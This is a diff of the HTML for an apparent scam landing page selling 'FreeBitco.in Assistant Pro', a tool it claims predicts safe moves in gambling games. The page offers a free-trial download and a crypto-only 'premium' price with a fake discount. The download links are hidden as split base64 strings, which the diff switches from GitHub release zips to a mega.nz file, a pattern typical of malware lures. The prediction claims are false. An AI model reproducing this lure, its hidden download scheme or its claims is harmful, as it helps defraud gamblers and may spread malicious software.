@@ -7,7 +7,8 @@
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;900&family=Exo+2:wght@300;400;500;600;700&family=Audiowide&display=swap" rel="stylesheet">
-    <link href="tooplate-neural-style.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@800&display=swap" rel="stylesheet">
+	<link href="tooplate-neural-style.css" rel="stylesheet">
 	<style>
 .hero {
   position: relative;
@@ -72,23 +73,14 @@
 
     <nav id="navbar">
         <div class="nav-container">
-            <a href="#home" class="logo-container">
-                <svg class="logo-svg" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
-                    <circle cx="50" cy="20" r="8" fill="none" stroke="#00ffff" stroke-width="2"/>
-                    <circle cx="25" cy="50" r="8" fill="none" stroke="#ff00ff" stroke-width="2"/>
-                    <circle cx="75" cy="50" r="8" fill="none" stroke="#ff00ff" stroke-width="2"/>
-                    <circle cx="50" cy="80" r="8" fill="none" stroke="#ffff00" stroke-width="2"/>
-                    <line x1="50" y1="28" x2="25" y2="42" stroke="#00ffff" stroke-width="1" opacity="0.6"/>
-                    <line x1="50" y1="28" x2="75" y2="42" stroke="#00ffff" stroke-width="1" opacity="0.6"/>
-                    <line x1="25" y1="58" x2="50" y2="72" stroke="#ff00ff" stroke-width="1" opacity="0.6"/>
-                    <line x1="75" y1="58" x2="50" y2="72" stroke="#ff00ff" stroke-width="1" opacity="0.6"/>
-                    <circle cx="50" cy="50" r="5" fill="#00ffff"/>
-                    <line x1="50" y1="28" x2="50" y2="45" stroke="#00ffff" stroke-width="1" opacity="0.6"/>
-                    <line x1="50" y1="55" x2="50" y2="72" stroke="#ffff00" stroke-width="1" opacity="0.6"/>
-                    <line x1="33" y1="50" x2="45" y2="50" stroke="#ff00ff" stroke-width="1" opacity="0.6"/>
-                    <line x1="55" y1="50" x2="67" y2="50" stroke="#ff00ff" stroke-width="1" opacity="0.6"/>
-                </svg>
-                <span class="logo-text">FreeBitco.in tools</span>
+            <a href="#home" class="logo-container" style="display:flex;align-items:center;gap:14px;text-decoration:none;">
+                <img src="images/logo.png"
+                     alt="FreeBitcoin Tools"
+                     style="width:56px;height:56px;object-fit:contain;display:block;">
+
+            <span style="font-family:'Nunito',sans-serif;font-size:28px;font-weight:800;letter-spacing:-1px;white-space:nowrap;">
+                <span style="color:#7CFF4F;">free</span><span style="color:#1FB7FF;">bitcoin</span><span style="color:#FFFFFF;"> Tools</span>
+            </span>
             </a>
             
             <div class="mobile-menu-toggle" id="mobile-toggle">
@@ -134,47 +126,247 @@
         </a>
     </section>
 
-<section id="about" class="fade-in" style="display: flex; flex-direction: column; align-items: center; text-align: center; padding: 50px 20px;">
+<section id="about" class="fade-in" style="
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    text-align:center;
+    padding:50px 20px;
+">
 
-    <h2 class="section-title">ABOUT THE PRODUCT</h2>
-    <br>
-    <div class="about-content" style="max-width: 1200px; display: flex; flex-direction: column; align-items: center;">
-        <h3>FreeBitco.in Assistant Overview</h3>
-        <p style="font-size: 1.1rem; line-height: 1.8; margin-bottom: 20px;">
-            Our FreeBitcoin Assistant Pro is a next-gen gaming assistant providing accurate insights for your next session.
-        </p>
-        <p style="font-size: 1.1rem; line-height: 1.8; color: var(--text-secondary); margin-bottom: 40px;">
-            With flexible control over game algorithms and an intuitive interface, users can focus on strategy rather than noise. Adaptive analytics help you respond to changes in the game session, making this tool a smart assistant for both beginners and professional players.
-        </p>
-        <br>
-        
-            <div style="text-align: center; max-width: 335px;">
-                <p style="font-size: 1rem; color: #00FFFF; font-weight: bold;">Assistant Pro v.3.0</p>
-                <img src="./freebitcoin.jpg" width="335" height="500" alt="Stake Mines" style="border: 0.5px solid #5AC8FA; box-shadow: 0 0 25px #5AC8FA; margin-bottom: 10px;">
-                <p style="font-size: 0.9rem; color: #5AC8FA;">Advanced minesweeper tool for predicting safe moves and maximizing your gains.</p>
-                <br>
-				<span style="font-size:13px;">
-                <b>Enjoy a 7-day free trial — no strings</b><br>
-            </span>
-                <button id="dlBtn4" disabled style="margin-top: 8px; background: transparent; border: none; cursor: not-allowed; opacity: 0.7;">
-                    <img src="./but.gif" width="210" height="55" alt="Download">
-                </button>
+<h3 class="section-title">Assistant Pro V3.0</h3>
 
-                <p style="font-size: 1.05rem; color: #00FFFF; font-weight: normal; line-height: 1.8; margin-top: 20px; font-style: italic; padding-left:16px;">
-                    <span style="font-size:15px;"><b>Buy the full version Assistant V.3.0</b></span>
-                </p>
-                <div style="text-align: center; margin-top:12px;">
-                <div class="buy-message" style="margin-top:10px; color:lime; font-weight:bold; min-height:18px;"></div>
-                    <button class="stat-card-link buyBtn" data-product="product1" data-tooltip="Lifetime license" 
-                            style="display: inline-block; width: 210px; padding: 8px 0;">
-                        <div class="stat-label" style="font-size: 18px;">BUY</div>
-                        <div class="stat-number" style="font-size: 20px;">$365</div>
-                    </button>
-                </div>
-            </div>
 
-        </div>
-    </div>
+<div style="
+    max-width:380px;
+    width:100%;
+    margin-top:25px;
+    padding:28px;
+    background:#0d0d0d;
+    border:1px solid #2d2d2d;
+    border-radius:22px;
+    box-shadow:
+        0 0 50px rgba(0,255,136,.08),
+        0 20px 60px rgba(0,0,0,.8);
+">
+
+
+<img src="https://freebitcoin-tools.github.io/download/images/freebitcoin.jpg"
+     width="335"
+     height="500"
+     alt="Assistant Pro"
+     style="
+        width:100%;
+        height:auto;
+        border-radius:6px;
+        border:1px solid #5AC8FA;
+        animation:imageGlow 3s infinite ease-in-out;
+     ">
+
+
+
+<div style="
+    height:1px;
+    margin:28px 0;
+    background:linear-gradient(90deg,transparent,#333,transparent);
+"></div>
+
+
+
+<div style="
+    color:#fff;
+    font-size:23px;
+    font-weight:700;
+    font-family:'Segoe UI',sans-serif;
+    letter-spacing:.5px;
+">
+    Try <span style="color:#00ff88;">Assistant Pro FREE</span>
+</div>
+
+
+<div style="
+    color:#999;
+    font-size:14px;
+    margin-top:10px;
+    font-family:'Segoe UI',sans-serif;
+">
+    7-Day Trial • No Strings Attached
+</div>
+
+
+
+<button id="dlBtn1" disabled style="
+    margin-top:22px;
+    background:transparent;
+    border:none;
+    cursor:not-allowed;
+    opacity:.9;
+">
+
+    <img id="downloadImg"
+         src="https://freebitcoin-tools.github.io/download/images/but.gif"
+         width="210"
+         height="55"
+         alt="Download"
+         style="transition:.3s ease;">
+
+</button>
+
+
+
+<div style="
+    height:1px;
+    margin:30px 0;
+    background:linear-gradient(90deg,transparent,#333,transparent);
+"></div>
+
+
+
+
+<div style="
+    color:#e8e8e8;
+    font-size:22px;
+    font-weight:600;
+    font-family:'Segoe UI',sans-serif;
+    letter-spacing:1px;
+">
+    Premium Access
+</div>
+
+
+
+<div class="price" style="margin-top:20px;">
+    <span class="old-price">$450</span>
+    <span class="new-price">$265</span>
+</div>
+
+
+
+<div style="margin-top:28px;">
+    <a href="#" class="crypto-btn">
+        Buy with Crypto
+    </a>
+</div>
+
+
+
+</div>
+
+
+
+
+<style>
+
+
+/* IMAGE LIGHT */
+@keyframes imageGlow{
+
+    0%,100%{
+        box-shadow:
+        0 0 12px rgba(90,200,250,.35);
+    }
+
+    50%{
+        box-shadow:
+        0 0 28px rgba(90,200,250,.75);
+    }
+
+}
+
+
+
+/* BUTTON HOVER LIGHT */
+#downloadImg:hover{
+
+    filter:
+    drop-shadow(0 0 4px rgba(255,255,255,.8))
+    drop-shadow(0 0 8px rgba(255,255,255,.5));
+
+}
+
+
+
+
+.price{
+    display:inline-flex;
+    align-items:center;
+    gap:15px;
+    padding:12px 22px;
+    background:#111;
+    border:1px solid #333;
+    border-radius:12px;
+    font-family:'Segoe UI',sans-serif;
+}
+
+
+
+.old-price{
+    color:#ff4d4d;
+    text-decoration:line-through;
+    text-decoration-thickness:2px;
+    font-size:28px;
+    opacity:.9;
+}
+
+
+
+.new-price{
+    color:#00ff88;
+    font-size:42px;
+    font-weight:700;
+    text-shadow:
+    0 0 15px rgba(0,255,136,.45);
+}
+
+
+
+
+.crypto-btn{
+
+    display:inline-block;
+    padding:16px 38px;
+    background:linear-gradient(135deg,#00ff88,#00c853);
+    color:#000;
+    font-family:'Segoe UI',sans-serif;
+    font-size:18px;
+    font-weight:700;
+    text-decoration:none;
+    border-radius:14px;
+    border:1px solid rgba(255,255,255,.15);
+
+    box-shadow:
+        0 0 20px rgba(0,255,136,.35),
+        inset 0 1px 0 rgba(255,255,255,.35);
+
+    transition:.25s ease;
+    letter-spacing:.5px;
+
+}
+
+
+
+.crypto-btn:hover{
+
+    transform:translateY(-2px) scale(1.03);
+
+    box-shadow:
+        0 0 35px rgba(0,255,136,.6),
+        0 10px 30px rgba(0,255,136,.25);
+
+}
+
+
+
+.crypto-btn:active{
+
+    transform:scale(.98);
+
+}
+
+
+</style>
+
+
 </section>
 
         <script>
@@ -205,34 +397,14 @@
             }
 
             activateBtn('dlBtn1', [
-                "aHR0cHM6Ly9naXRodWIuY29tL0dyZWdvcnlNQWxsYW4vQX",
-                "Npc3RCbGFja0phY2tQcm8vcmVsZWFzZXMvZG93bmxvYWQvQ",
-                "mxhY2tKYWNrUHJvL0FzaXN0QmxhY2tKYWNrUHJvLnppcA=="
-            ]);
-
-            activateBtn('dlBtn2', [
-                "aHR0cHM6Ly9naXRodWIuY29tL0dyZWdv",
-                "cnlNQWxsYW4vYXNzaXN0cmFkYXJwcm8vc",
-		        "mVsZWFzZXMvZG93bmxvYWQvYXNzaX",
-		        "N0cmFkYXIvQXNpc3RSYWRhclByby56aXA="
-            ]);
-
-            activateBtn('dlBtn3', [
-                "aHR0cHM6Ly9naXRodWIuY29tL0dyZWdvcnlNQW",
-                "xsYW4vYXNzaXN0cHJvL3JlbGVhc2VzL2Rv",
-                "d25sb2FkL3ZlcnNpb24vQXNpc3RQcm8uemlw"
-            ]);
-
-            activateBtn('dlBtn4', [
-                "aHR0cHM6Ly9naXRodWIuY29tL0dyZW",
-                "dvcnlNQWxsYW4vYXNzaXN0bWluZXMvcmVsZWF",
-		        "zZXMvZG93bmxvYWQvYXNzaXN0L0FzaXN0TWluZXNQcm8uemlw"
+                "aHR0cHM6Ly9tZWdhLm56L2ZpbGUvNXJRSGpZVFojZHRHLU1vSXljUXRTMkdV",
+                "dWFKeEV3TWJrcVJhcnQzLXUtYllCNVZSWmJjSQ=="
             ]);
         </script>
 
 
 				
-                <!-- Блок сообщений для buy.js -->
+               
             </div>
         </div>
     </section>
@@ -289,7 +461,7 @@
             </div>
         </div>
         <div class="footer-bottom">
-            <p>&copy; 2025 Multi-Platform Assistant Pro Portfolio. All rights reserved. Provided by <a href="https://assistant-pro.github.io/Multi-Platform/index.html">FreeBitco.in Assistant Pro</a></p>
+            <p>&copy; 2025 Multi-Platform Assistant Pro Portfolio. All rights reserved. Provided by <a href="https://freebitcoin-tools.github.io/download/index.html">FreeBitco.in Assistant Pro</a></p>
         </div>
     </footer>
 
